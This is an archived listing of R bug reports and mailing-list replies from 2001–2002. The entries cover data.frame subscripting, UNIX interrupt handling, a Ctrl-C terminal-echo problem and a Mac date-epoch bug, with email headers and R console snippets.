To: r-bugs@biostat.ku.dk
Subject: "[.data.frame" allows un-named 3rd subscript


Since the Extract page has usage as:

     x[i, j, ... , drop=TRUE]

I would expect that 'drop=' would need to be given to the third 'subscript'

> diag(4)[ , 4 , 4 ] # Forgot 'drop=' or added extra ','
Error in diag(4)[, 4, 4] : incorrect number of dimensions
> 
> as.data.frame( diag(4) )[ , 4 , 4 ] # should return error, right?
[1] 0 0 0 1


Also note:

> diag(4)[ ,  , drop=TRUE ]
     [,1] [,2] [,3] [,4]
[1,]    1    0    0    0
[2,]    0    1    0    0
[3,]    0    0    1    0
[4,]    0    0    0    1
> 
> as.data.frame( diag(4) )[ ,  , drop=TRUE ]
Error in [.data.frame(as.data.frame(diag(4)), , , drop = 4) : 
	Argument "j" is missing, with no default
> 

--please do not edit the information below--

Version:
 platform = sparc-sun-solaris2.7
 arch = sparc
 os = solaris2.7
 system = sparc, solaris2.7
 status = 
 major = 1
 minor = 2.3
 year = 2001
 month = 04
 day = 26
 language = R

Search Path:
 .GlobalEnv, package:nls, package:nlme, package:ctest, Autoloads, package:base



Chuck

-- 
Charles C. Berry                        (858) 534-2098 
                                         Dept of Family/Preventive Medicine
E mailto:cberry@tajo.ucsd.edu	         UC San Diego
http://hacuna.ucsd.edu/members/ccb.html  La Jolla, San Diego 92093-0645

 

==> 989.reply.1 <==
From pd@blueberry.kubism.ku.dk  Mon Jun 18 22:35:29 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA15008;
	Mon, 18 Jun 2001 22:35:28 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) id WAA31163;
	Mon, 18 Jun 2001 22:38:38 +0200
Sender: pd@pubhealth.ku.dk
To: cberry@tajo.ucsd.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] "[.data.frame" allows un-named 3rd subscript (PR#989)
References: <200106182010.WAA14911@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 18 Jun 2001 22:38:38 +0200
In-Reply-To: cberry@tajo.ucsd.edu's message of "Mon, 18 Jun 2001 22:10:29 +0200 (MET DST)"
Message-ID: <x27ky9o75d.fsf@blueberry.kubism.ku.dk>
Lines: 34
X-Mailer: Gnus v5.7/Emacs 20.7
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit

cberry@tajo.ucsd.edu writes:

> Since the Extract page has usage as:
> 
>      x[i, j, ... , drop=TRUE]
> 
> I would expect that 'drop=' would need to be given to the third 'subscript'
> 
> > diag(4)[ , 4 , 4 ] # Forgot 'drop=' or added extra ','
> Error in diag(4)[, 4, 4] : incorrect number of dimensions
> > 
> > as.data.frame( diag(4) )[ , 4 , 4 ] # should return error, right?
> [1] 0 0 0 1
> 

And the bug is?

The generic indexing should really be x[...,drop=T].  Methods for
specific classes can specialize to a particular number of indices if
they want to, which is what is happening here

> get ("[.data.frame")
function (x, i, j, drop = if (missing(i)) TRUE else length(cols) == 
    1) 

one could fairly easily slip in a "..." argument after "j", and then
inside the function give an error if "..." is not empty, but what
would the point be?

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 989.followup.1 <==
From cberry@tajo.ucsd.edu  Mon Jun 18 23:06:32 2001
Received: from mailbox3.ucsd.edu (mailbox3.ucsd.edu [132.239.1.55])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA15201;
	Mon, 18 Jun 2001 23:06:31 +0200 (MET DST)
Received: from smtp.ucsd.edu (smtp.ucsd.edu [132.239.1.49])
	by mailbox3.ucsd.edu (8.10.1/8.11.0) with ESMTP id f5IL6PR16820;
	Mon, 18 Jun 2001 14:06:25 -0700 (PDT)
Received: from tajo.ucsd.edu (tajo.ucsd.edu [132.239.99.2])
	by smtp.ucsd.edu (8.9.3/8.9.3) with ESMTP id OAA06469;
	Mon, 18 Jun 2001 14:06:24 -0700 (PDT)
Received: from localhost by tajo.ucsd.edu (8.9.3+Sun/SMI-SVR4-UCSD.1)
	id OAA15733; Mon, 18 Jun 2001 14:09:49 -0700 (PDT)
Date: Mon, 18 Jun 2001 14:09:49 -0700 (PDT)
From: "Charles C. Berry" <cberry@tajo.ucsd.edu>
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] "[.data.frame" allows un-named 3rd subscript (PR#989)
In-Reply-To: <x27ky9o75d.fsf@blueberry.kubism.ku.dk>
Message-ID: <Pine.GSO.4.05.10106181348090.12737-100000@tajo.ucsd.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


See below.

On 18 Jun 2001, Peter Dalgaard BSA wrote:

> cberry@tajo.ucsd.edu writes:
> 
> > Since the Extract page has usage as:
> > 
> >      x[i, j, ... , drop=TRUE]
> > 
> > I would expect that 'drop=' would need to be given to the third 'subscript'
> > 
> > > diag(4)[ , 4 , 4 ] # Forgot 'drop=' or added extra ','
> > Error in diag(4)[, 4, 4] : incorrect number of dimensions
> > > 
> > > as.data.frame( diag(4) )[ , 4 , 4 ] # should return error, right?
> > [1] 0 0 0 1
> > 
> 
> And the bug is?
> 
> The generic indexing should really be x[...,drop=T].  Methods for
> specific classes can specialize to a particular number of indices if
> they want to, which is what is happening here
> 
> > get ("[.data.frame")
> function (x, i, j, drop = if (missing(i)) TRUE else length(cols) == 
>     1) 
> 
> one could fairly easily slip in a "..." argument after "j", and then
> inside the function give an error if "..." is not empty, but what
> would the point be?
> 

The point would be to catch errors like this

for ( i in 1:2 ) foo[i,2] <- my.fun( bar[,i,2] , another.arg )

that might otherwise pass unnoticed when 'bar' is a data.frame.


Charles C. Berry                        (858) 534-2098 
                                         Dept of Family/Preventive Medicine
E mailto:cberry@tajo.ucsd.edu	         UC San Diego
http://hacuna.ucsd.edu/members/ccb.html  La Jolla, San Diego 92093-0645

 


==> 989.audit <==
Tue Jun 19 09:07:09 2001	ripley	moved from incoming to Low-level
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1068 *
Subject: Interrupts (was Re: [Rd] X11 protocol errors ...)
From: Luke Tierney <luke@nokomis.stat.umn.edu>
Date: Wed, 22 Aug 2001 19:32:51 -0500
--see also followup in PR#1069
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1068 <==
From luke@nokomis.stat.umn.edu  Thu Aug 23 02:32:58 2001
Received: from nokomis.stat.umn.edu (root@nokomis.stat.umn.edu [134.84.86.39])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id CAA09952
	for <R-bugs@biostat.ku.dk>; Thu, 23 Aug 2001 02:32:57 +0200 (MET DST)
Received: (from luke@localhost)
	by nokomis.stat.umn.edu (8.11.3/8.10.2/SuSE Linux 8.10.0-0.3) id f7N0Wpq10715;
	Wed, 22 Aug 2001 19:32:51 -0500
Date: Wed, 22 Aug 2001 19:32:51 -0500
From: Luke Tierney <luke@nokomis.stat.umn.edu>
To: maechler@stat.math.ethz.ch
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Interrupts (was Re: [Rd] X11 protocol errors ...)
Message-ID: <20010822193251.A10682@nokomis.stat.umn.edu>
References: <200108221235.OAA05855@pubhealth.ku.dk>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i
In-Reply-To: <200108221235.OAA05855@pubhealth.ku.dk>; from maechler@stat.math.ethz.ch on Wed, Aug 22, 2001 at 02:35:24PM +0200

Martin wrote:

> Just this morning,
> I found (again!, we had something close to this before) 
> the following related bugous behavior :
> After interrupting a plot (which would have taken a few minutes and was
> "wrong" anyway), starting another plot, interrupting again [with C-c],
> and maybe the same once more,
> R started just giving a ">" prompt
> but did not react any further at all.
> (C-c would return the prompt, but no other reaction was possible)
> Only killing the R process helped.
> 
> I may try to reproduce more exactly later today.

I'm surprised we don't get more of these sorts of things on UNIX.  Our
current UNIX interrupt handling approach takes an immediate LONGJMP
out of the signal handler no matter where the signal occurs (except
for two places where signals are suspended).  Any place where an
invariant is temporarily broken, any place where an assignment is not
yet complete, is a potential trouble spot.

I've been meaning to raise this issue at some point: I think we will
need to eventually spend some time re-examining how we want to handle
interrupts.  Right now on Windows/Mac interrupts are only processed at
special points in the evaluation process, which is a bit restrictive
(but perhaps unavoidable due to OS limitations).  On UNIX on the other
hand we LONGJUMP out of the signal handler except for the very few
places where the signal gets masked temporarily (GC and one place in
graphics I believe).  The UNIX approach is much too loose even now,
and it becomes even more untenable if we add any kind of threading
support.

We will I think have to come up with a cleaner model for very
selectively enabling interrupt processing, perhaps with some
integration with the external function registration mechanism Duncan
added recently (e.g. marking a function as one where LONGJMP's are
safe).  We will also need some means of controlling interrupt
behaviour from R, such as having some sort of without.interrupts and
with.interrupts functions to be able to program reliable interaction
with interrupts at the R level. (Another sort of thing we might
consider is suspending interrupts during on.exit processing.)

It's a farily big can of worms, and probably not urgent for now, but
we will need to look at it eventually.

luke

-- 
Luke Tierney
University of Minnesota                      Phone:           612-625-7843
School of Statistics                         Fax:             612-624-8868
313 Ford Hall, 224 Church St. S.E.           email:      luke@stat.umn.edu
Minneapolis, MN 55455 USA                    WWW:  http://www.stat.umn.edu

==> 1068.audit <==
Tue Aug 28 10:16:46 2001	ripley	moved from incoming to Low-level
Tue Aug 28 10:23:54 2001	ripley	changed notes
Tue Aug 28 10:23:54 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1069 *
Subject: Interrupts (was Re: [Rd] X11 protocol errors ...)
From: "John W. Eaton" <jwe@bevo.che.wisc.edu>
Date: Wed, 22 Aug 2001 21:56:33 -0500
--part of PR#1068
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1069 <==
From jwe@ricotta.che.wisc.edu  Thu Aug 23 04:57:11 2001
Received: from ricotta.che.wisc.edu (ricotta.che.wisc.edu [128.104.179.160])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id EAA10175
	for <R-bugs@biostat.ku.dk>; Thu, 23 Aug 2001 04:57:10 +0200 (MET DST)
Received: from ricotta.che.wisc.edu (jwe@localhost [127.0.0.1])
        by localhost (8.12.0.Beta7/8.12.0.Beta7/Debian 8.12.0.Beta7-1) with ESMTP id f7N2uZqU003270;
	Wed, 22 Aug 2001 21:56:35 -0500
Received: (from jwe@localhost)
        by ricotta.che.wisc.edu (8.12.0.Beta7/8.12.0.Beta7/Debian 8.12.0.Beta7-1) id f7N2uXNS003266;
	Wed, 22 Aug 2001 21:56:33 -0500
From: "John W. Eaton" <jwe@bevo.che.wisc.edu>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15236.28897.468790.842201@ricotta.che.wisc.edu>
Date: Wed, 22 Aug 2001 21:56:33 -0500
To: Luke Tierney <luke@nokomis.stat.umn.edu>
Cc: maechler@stat.math.ethz.ch, r-devel@stat.math.ethz.ch,
        R-bugs@biostat.ku.dk
Subject: Interrupts (was Re: [Rd] X11 protocol errors ...)
In-Reply-To: <20010822193251.A10682@nokomis.stat.umn.edu>
References: <200108221235.OAA05855@pubhealth.ku.dk>
	<20010822193251.A10682@nokomis.stat.umn.edu>
X-Mailer: VM 6.95 under Emacs 20.7.2

On 22-Aug-2001, Luke Tierney <luke@nokomis.stat.umn.edu> wrote:

| We will I think have to come up with a cleaner model for very
| selectively enabling interrupt processing, perhaps with some
| integration with the external function registration mechanism Duncan
| added recently (e.g. marking a function as one where LONGJMP's are
| safe).

FWIW, Octave doesn't do this correctly either, it just does a longjmp,
same as R, which can result in leaking memory, and possibly other bad
things.

The way Bash handles this is to only set a flag in the handler for
SIGINT, then at safe places in the code, there are

  QUIT;

statements.  These are macros that expand to some code that may
longjump somewhere depending on the interrupt state.  This method
avoids the problems of jumping out of the signal handler, which may
result in memory leaks or inconsistencies in global state.  The hard
part is inserting the (many!) QUIT statements, though it is probably
somewhat easier if this type of choice is made early on in the life of
the program instead of late.

I only mention Bash because it is a program that is expected to
handle a lot of interrupts without leaking memory or crashing, and
seems to do so reasonably well.

Packages like R and Octave also have to be able to handle interrupts
in calls Fortran or C code that may run for a long time, and which
cannot be modified (at least not easily) to add the equivalent QUIT
calls.  I'm not sure what the right solution is for cases like that.

jwe

-- 
www.octave.org        | Unfortunately we were hoplessly optimistic in 1954
www.che.wisc.edu/~jwe | about the problems of debugging FORTRAN programs.
                      |                                       -- J. Backus

==> 1069.audit <==
Tue Aug 28 10:16:46 2001	ripley	moved from incoming to Low-level
Tue Aug 28 10:23:24 2001	ripley	changed notes
Tue Aug 28 10:23:24 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1880 *
Subject:  You requested this report 
From: Berwin Turlach <berwin@maths.uwa.edu.au>
Date: Tue, 6 Aug 2002 16:57:54 +0800
--The bug is that we get as far as mkCLOSXP before an error is reported
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1880 <==
From postmaster@franz.stat.wisc.edu  Tue Aug  6 10:58:39 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA21842
	for <r-bugs@biostat.ku.dk>; Tue, 6 Aug 2002 10:58:38 +0200 (MET DST)
Received: from asclepius.uwa.edu.au (really [130.95.128.56]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17c0A8-000IX5C@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Tue, 6 Aug 2002 03:57:56 -0500 (CDT) 
Received: from 127.0.0.1 (localhost [127.0.0.1])
	by dummy.domain.name (Postfix) with SMTP id DE5CB2F8B7F
	for <r-bugs@r-project.org>; Tue,  6 Aug 2002 16:56:24 +0800 (WST)
Received: from bossiaea.maths.uwa.edu.au (bossiaea.maths.uwa.edu.au [130.95.16.247])
	by asclepius.uwa.edu.au (Postfix) with ESMTP id C3D5C2F8B56
	for <r-bugs@r-project.org>; Tue,  6 Aug 2002 16:56:24 +0800 (WST)
Received: (from berwin@localhost)
	by bossiaea.maths.uwa.edu.au (8.9.3/8.9.3) id QAA23639;
	Tue, 6 Aug 2002 16:57:54 +0800
Date: Tue, 6 Aug 2002 16:57:54 +0800
From: Berwin Turlach <berwin@maths.uwa.edu.au>
Message-Id: <200208060857.QAA23639@bossiaea.maths.uwa.edu.au>
To: r-bugs@r-project.org
Subject:  You requested this report 
Cc: berwin@bossiaea.maths.uwa.edu.au

Hi guys,

I am planning to let my students do some simulations regarding the
bias of the sample standard deviation.  The following function is
pretty standard (so I hope :) ):

> sim <- function(nrng, replic, true.s, random, ...){
+   res <- NULL
+   for(n in nrng){
+     data <- matrix(random(n*replic,...), ncol=replic)
+     val <- sqrt(apply(data, 2, var))
+     res <- rbind(res,
+                  cbind(bias=val-true.s, n=n))
+   }
+   res
+ }

It takes a vector of sample sizes, a number (the number of
replications we want to simulate), the true value of the standard
deviation and a function that generates the random number (which may
depend on additional paramters).  So let's try this:

> nrng <- c(2,4,8,16,32,64)
> replic <- 500
> true.s <- 2
> tmp <- sim(nrng, replic, true.s, rnorm, sd = 2)

Yes, seems to work.  Now I thought of perhaps creating a list of
several scenarios (random numbers) and loop over it.  So I tried:

> dist <- list(list(rnorm, true.s = 2, sd=2),
+              list(rexp, true.s = 1)
+              )

Followed by

> res <- sim(nrng, replic, dist[[1]][2], dist[[1]][1], dist[[1]][-c(1,2)])
Error in as.vector(data) : couldn't find function "random"

O.k., this doesn't work.  So let us try:

> res <- sim(nrng, replic, dist[[1]][2], as.function(dist[[1]][1]), dist[[1]][-c(1,2)])
Error in as.function.default(dist[[1]][1]) : 
        invalid body argument for "function"
Should NEVER happen; please bug.report() [mkCLOSXP]

No idea why you consider this a bug. :)  I would have been willing to
put it down to my misuse of R.  But since you requested a bug report,
here it is.

Cheers,

        Berwin

BTW:  How can I actually do what I want to do?  I realise that I am
probably on a completely wrong track regarding the passing of the
... parameters.

--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = 
 major = 1
 minor = 5.1
 year = 2002
 month = 06
 day = 17
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


==> 1880.audit <==
Mon Aug 19 22:35:34 2002	thomas	changed notes
Mon Aug 19 22:35:34 2002	thomas	foobar
Mon Aug 19 22:35:34 2002	thomas	moved from incoming to Low-level
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2253 *
Subject: [R] CTRL-C suspends echo of shell (R versions 1.6.0 and 1.6.1)
From: Wolfram Fischer - Z/I/M <wolfram@fischer-zim.ch>
Date: Mon, 4 Nov 2002 10:18:48 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2253 <==
From wolfram@fischer-zim.ch  Mon Nov  4 10:19:44 2002
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA18585
	for <r-bugs@biostat.ku.dk>; Mon, 4 Nov 2002 10:19:43 +0100 (MET)
Received: from ecslin02.ecs.ch ([193.134.251.17])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 188dNq-0001QS-00
	for <r-bugs@r-project.org>; Mon, 04 Nov 2002 03:18:58 -0600
Received: from s1x.zimnet.ch (dialin-d-15.ecs.ch [194.69.197.15])
	by ecslin02.ecs.ch (8.9.3/8.9.3) with ESMTP id KAA32376
	for <r-bugs@r-project.org>; Mon, 4 Nov 2002 10:18:55 +0100
Received: (from wf@localhost)
	by s1x.zimnet.ch (8.11.6/8.11.6/SuSE Linux 0.5) id gA49Im017451
	for r-bugs@r-project.org; Mon, 4 Nov 2002 10:18:48 +0100
Date: Mon, 4 Nov 2002 10:18:48 +0100
From: Wolfram Fischer - Z/I/M <wolfram@fischer-zim.ch>
To: r-bugs@r-project.org
Subject: [R] CTRL-C suspends echo of shell (R versions 1.6.0 and 1.6.1)
Message-ID: <20021104101848.A17333@s1x.zimnet.ch>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.3.22.1i

Problem:
- Shell does not echo anymore 
  after using CTRL-C (to interrupt calculations)
  once during a R session.

Procedure:
- [start session]  R
- [input]          CTRL-C
- [end session]    q()


Some details:
- `stty` before: speed 38400 baud; line = 0; lnext = <undef>;

- `stty` after: speed 38400 baud; line = 0; lnext = <undef>; min = 1; time = 0;
    -icrnl
    -icanon -echo

I have seen the problem in versions 1.6.0 and 1.6.1, but not in 1.5.1
which I am running on SuSE Linux 7.3. The shell used is bash-2.05.0(1).


Wolfram Fischer

==> 2253.reply.1 <==
From p.dalgaard@biostat.ku.dk  Mon Nov  4 10:58:57 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA19354;
	Mon, 4 Nov 2002 10:58:56 +0100 (MET)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.6/8.11.6) id gA49wsH01807;
	Mon, 4 Nov 2002 10:58:54 +0100
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: wolfram@fischer-zim.ch
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [R] CTRL-C suspends echo of shell (R versions 1.6.0 and 1.6.1) (PR#2253)
References: <200211040919.KAA18590@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 04 Nov 2002 10:58:53 +0100
In-Reply-To: <200211040919.KAA18590@pubhealth.ku.dk>
Message-ID: <x2y989bqqq.fsf@biostat.ku.dk>
Lines: 33
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

wolfram@fischer-zim.ch writes:

> Problem:
> - Shell does not echo anymore 
>   after using CTRL-C (to interrupt calculations)
>   once during a R session.
> 
> Procedure:
> - [start session]  R
> - [input]          CTRL-C
> - [end session]    q()
> 
> 
> Some details:
> - `stty` before: speed 38400 baud; line = 0; lnext = <undef>;
> 
> - `stty` after: speed 38400 baud; line = 0; lnext = <undef>; min = 1; time = 0;
>     -icrnl
>     -icanon -echo
> 
> I have seen the problem in versions 1.6.0 and 1.6.1, but not in 1.5.1
> which I am running on SuSE Linux 7.3. The shell used is bash-2.05.0(1).

Seen here too, but I actually thought it took more to provoke it.
Blind-enter "stty sane" to revert.

(Might this be related to the readline stack issue?)

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 2253.audit <==
Mon Nov  4 15:22:27 2002	maechler	foobar
Mon Nov  4 15:22:27 2002	maechler	moved from incoming to Low-level
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Macintosh

* PR# 1819 *
Subject: Date arithmetic fails
From: RML27@cornell.edu
Date: Sun, 21 Jul 2002 20:26:12 +0200 (MET DST)
--In fact, as.POSIXct is off by 66 years. See
--   http://developer.apple.com/qa/ops/ops23.html
--This is semifixed, but timezones still don't work
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1819 <==
From RML27@cornell.edu  Sun Jul 21 20:26:12 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA29488
	for <R-bugs@biostat.ku.dk>; Sun, 21 Jul 2002 20:26:12 +0200 (MET DST)
Date: Sun, 21 Jul 2002 20:26:12 +0200 (MET DST)
From: RML27@cornell.edu
Message-Id: <200207211826.UAA29488@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Date arithmetic fails

Full_Name: Ronnen Levinson
Version: 1.5.1
OS: Mac OS 10.1 
Submission from: (NULL) (12.232.201.92)


The value returned by strptime behaves badly after arithmetic operation and/or
combination.

> a=strptime("2002-06-01 12:15:01","%Y-%m-%d %H:%M:%S")
> a
[1] "2002-06-01 12:15:01"
> a+0
[1] "1932-04-25 21:46:45"
> a+3600
[1] "1932-04-25 22:46:45"
b=c(a)
> b
[1] "1932-04-25 21:46:45"

==> 1819.followup.1 <==
From tlumley@u.washington.edu  Mon Jul 22 17:58:29 2002
Received: from mxout3.cac.washington.edu (mxout3.cac.washington.edu [140.142.32.19])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA04051
	for <R-bugs@biostat.ku.dk>; Mon, 22 Jul 2002 17:58:28 +0200 (MET DST)
Received: from mailscan-out2.cac.washington.edu (mailscan-out2.cac.washington.edu [140.142.33.17])
	by mxout3.cac.washington.edu (8.12.1+UW01.12/8.12.1+UW02.06) with SMTP id g6MFvkYu014347
	for <R-bugs@biostat.ku.dk>; Mon, 22 Jul 2002 08:57:46 -0700
Received: FROM homer41.u.washington.edu BY mailscan-out2.cac.washington.edu ; Mon Jul 22 08:57:44 2002 -0700
Received: from localhost (tlumley@localhost)
	by homer41.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g6MFviE5101740;
	Mon, 22 Jul 2002 08:57:44 -0700
Date: Mon, 22 Jul 2002 08:57:43 -0700 (PDT)
From: Thomas Lumley <tlumley@u.washington.edu>
To: RML27@cornell.edu
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: Date arithmetic fails (PR#1819)
In-Reply-To: <200207211826.UAA29493@pubhealth.ku.dk>
Message-ID: <Pine.A41.4.44.0207220855460.93146-100000@homer41.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Sun, 21 Jul 2002 RML27@cornell.edu wrote:

> Full_Name: Ronnen Levinson
> Version: 1.5.1
> OS: Mac OS 10.1
> Submission from: (NULL) (12.232.201.92)
>
>
> The value returned by strptime behaves badly after arithmetic operation and/or
> combination.
>
> > a=strptime("2002-06-01 12:15:01","%Y-%m-%d %H:%M:%S")
> > a
> [1] "2002-06-01 12:15:01"
> > a+0
> [1] "1932-04-25 21:46:45"
> > a+3600
> [1] "1932-04-25 22:46:45"
> b=c(a)
> > b
> [1] "1932-04-25 21:46:45"

The problem appears to be with as.POSIXct on the Mac.  Operations that
don't coerce to POSIXct work, those that do, don't.

	-thomas



==> 1819.followup.2 <==
From tlumley@u.washington.edu  Mon Jul 22 18:58:10 2002
Received: from mxout4.cac.washington.edu (mxout4.cac.washington.edu [140.142.33.19])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA04223
	for <R-bugs@biostat.ku.dk>; Mon, 22 Jul 2002 18:58:09 +0200 (MET DST)
Received: from mailscan-out1.cac.washington.edu (mailscan-out1.cac.washington.edu [140.142.32.17])
	by mxout4.cac.washington.edu (8.12.1+UW01.12/8.12.1+UW02.06) with SMTP id g6MGvRS4020128
	for <R-bugs@biostat.ku.dk>; Mon, 22 Jul 2002 09:57:27 -0700
Received: FROM homer41.u.washington.edu BY mailscan-out1.cac.washington.edu ; Mon Jul 22 09:57:25 2002 -0700
Received: from localhost (tlumley@localhost)
	by homer41.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g6MGvOqn168250;
	Mon, 22 Jul 2002 09:57:24 -0700
Date: Mon, 22 Jul 2002 09:57:24 -0700 (PDT)
From: Thomas Lumley <tlumley@u.washington.edu>
To: RML27@cornell.edu
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: Date arithmetic fails (PR#1819)
In-Reply-To: <Pine.A41.4.44.0207220855460.93146-100000@homer41.u.washington.edu>
Message-ID: <Pine.A41.4.44.0207220944440.93146-100000@homer41.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

>
> The problem appears to be with as.POSIXct on the Mac.  Operations that
> don't coerce to POSIXct work, those that do, don't.
>

I think I've found why.

The epoch date on the Mac is 1904-1-1 not 1970-1-1.

This has two effects. First, everything's off by 66 years. Second, it's
important to treat the time as unsigned long, not long, since it's already
greater than 2^31 some time in 1997.

Aren't standards wonderful?

	-thomas


==> 1819.audit <==
Mon Jul 22 17:49:01 2002	thomas	foobar
Mon Jul 22 17:49:01 2002	thomas	moved from incoming to not-reproducible
Mon Jul 22 17:52:41 2002	thomas	moved from not-reproducible to Macintosh
Mon Jul 22 18:21:41 2002	thomas	changed notes
Mon Jul 22 18:21:41 2002	thomas	foobar
Mon Jul 22 19:05:40 2002	thomas	changed notes
Mon Jul 22 19:05:40 2002	thomas	foobar
Fri Sep 27 17:49:20 2002	thomas	changed notes
Fri Sep 27 17:49:20 2002	thomas	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1991 *
Subject: Mac Save As... bug
From: Tim Cole <tjc1@cam.ac.uk>
Date: Sun, 8 Sep 2002 13:47:00 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1991 <==
From postmaster@franz.stat.wisc.edu  Sun Sep  8 15:14:48 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA17766
	for <r-bugs@biostat.ku.dk>; Sun, 8 Sep 2002 15:14:43 +0200 (MET DST)
Received: from libra.cus.cam.ac.uk (really [131.111.8.19]) by franz.stat.wisc.edu
	via smail with esmtp (ident cusexim using rfc1413)
	id <m17o1aN-000IXYC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Sun, 8 Sep 2002 07:54:43 -0500 (CDT) 
Received: from line55.slip.csx.cam.ac.uk ([131.111.99.155])
	by libra.cus.cam.ac.uk with esmtp (Exim 4.10)
	id 17o1ZK-0007bt-00
	for r-bugs@r-project.org; Sun, 08 Sep 2002 13:53:38 +0100
Mime-Version: 1.0
X-Sender: tcole@stella.ich.ucl.ac.uk
Message-Id: <p05111b03b9a0ed6293f0@[131.111.99.150]>
Date: Sun, 8 Sep 2002 13:47:00 +0100
To: r-bugs@r-project.org
From: Tim Cole <tjc1@cam.ac.uk>
Subject: Mac Save As... bug
Content-Type: multipart/mixed; boundary="============_-1180632878==_============"

--============_-1180632878==_============
Content-Type: text/plain; charset="us-ascii" ; format="flowed"

# Your mailer is set to "none" (default on Windows),
# hence we cannot send the bug report directly from R.
# Please copy the bug report (after finishing it) to
# your favorite email program and send it to
#
#       r-bugs@r-project.org
#
######################################################

The history is as follows:

# set wd using <cmd>D dialog

# load Jim Ramsay's fda package, the splines package, and .Rdata
# the attachment fda.sit is Jim Ramsay's fda functions Stuffed
# the attachment .Rdata is the data file

attach("fda")
library(splines)
attach(".Rdata")

# attach data file
attach(colldata)

# run function plotfda which plots a graph
plotfda()

# select and save the graph to a new file using File>Save As...

# (incidentally the file save dialog does not open in the working
# directory - is this a bug in itself?)

